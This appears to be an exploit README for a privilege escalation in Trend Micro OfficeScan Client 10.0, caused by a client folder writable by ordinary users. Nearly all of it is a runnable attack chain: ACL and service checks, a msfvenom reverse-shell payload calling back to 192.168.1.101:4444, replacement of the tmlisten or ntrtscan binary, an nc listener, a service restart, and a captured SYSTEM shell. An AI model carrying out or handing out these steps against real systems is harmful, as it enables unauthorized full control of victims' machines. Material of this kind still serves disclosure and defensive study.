<a target="_blank" href="https://img.shields.io/badge/plateform-windows-blue.svg" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/plateform-windows-blue.svg">
</a>
<a target="_blank" href="https://img.shields.io/badge/version-10.0-yellow" rel="noopener noreferrer">
    <img src="https://img.shields.io/badge/version-10.0-yellow">
</a>
<a href="" rel="nofollow">
    <img src="https://img.shields.io/badge/service-acl-red">
</a>

```bash
#########################################################################
#                                                                       #
#  Exploit Title: Trend Micro OfficeScan Client 10.0 - ACL Service LPE  #
#  Date: 2023/05/04                                                     #
#  Exploit Author: msd0pe                                               #
#  Vendor Homepage: https://www.trendmicro.com                          #
#  My Github: https://github.com/msd0pe-1                               # 
#                                                                       # 
#########################################################################
```

<h3>Trend Micro OfficeScan Client:</h3>
Versions =< 10.0 contains wrong ACL rights on the OfficeScan client folder which allows attackers to escalate privileges to the system level through the services. This vulnerabily does not need any privileges access.

<h2>Verify the folder rights:</h2>

```bash
    > icacls "C:\Program Files (x86)\Trend Micro\OfficeScan Client"

    C:\Program Files (x86)\Trend Micro\OfficeScan Client NT SERVICE\TrustedInstaller:(F)
                                                         NT SERVICE\TrustedInstaller:(CI)(IO)(F)
                                                         NT AUTHORITY\SYSTEM:(F)
                                                         NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
                                                         BUILTIN\Administrators:(F)
                                                         BUILTIN\Administrators:(OI)(CI)(IO)(F)
                                                         BUILTIN\Users:(F)
                                                         BUILTIN\Users:(OI)(CI)(IO)(F)
                                                         CREATOR OWNER:(OI)(CI)(IO)(F)
                                                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
                                                         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)
```

<h2>Get informations about the services:</h2>

```bash
    > sc qc tmlisten

    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: tmlisten
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : "C:\Program Files (x86)\Trend Micro\OfficeScan Client\tmlisten.exe"
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : OfficeScan NT Listener
            DEPENDENCIES       : Netman
                               : WinMgmt
            SERVICE_START_NAME : LocalSystem
```

OR

```bash
    > sc qc ntrtscan

    SERVICE_NAME: ntrtscan
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : "C:\Program Files (x86)\Trend Micro\OfficeScan Client\ntrtscan.exe"
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : OfficeScan NT RealTime Scan
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem
```

<h2>Generate a reverse shell:</h2>

```bash
    > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe -o tmlisten.exe
 ```

OR

```bash
    > msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe -o ntrtscan.exe
```

<h2>Upload the reverse shell to C:\Program Files(x86)\Trend Micro\OfficeScan Client\tmlisten.exe OR C:\Program Files(x86)\Trend Micro\OfficeScan Client\ntrtscan.exe</h2>


<h2>Start listener</h2>

```bash
    > nc -lvp 4444
```

<h2>Reboot the service/server</h2>

```bash
    > sc stop tmlisten
    > sc start tmlisten
```
OR

```bash
    > sc stop ntrtscan
    > sc start ntrtscan
```

OR

```bash
    > shutdown /r
```

<h2>Enjoy !</h2>

```bash
    192.168.1.102: inverse host lookup failed: Unknown host
    connect to [192.168.1.101] from (UNKNOWN) [192.168.1.102] 51309
    Microsoft Windows [Version 10.0.19045.2130]
    (c) Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami

    nt authority\system
```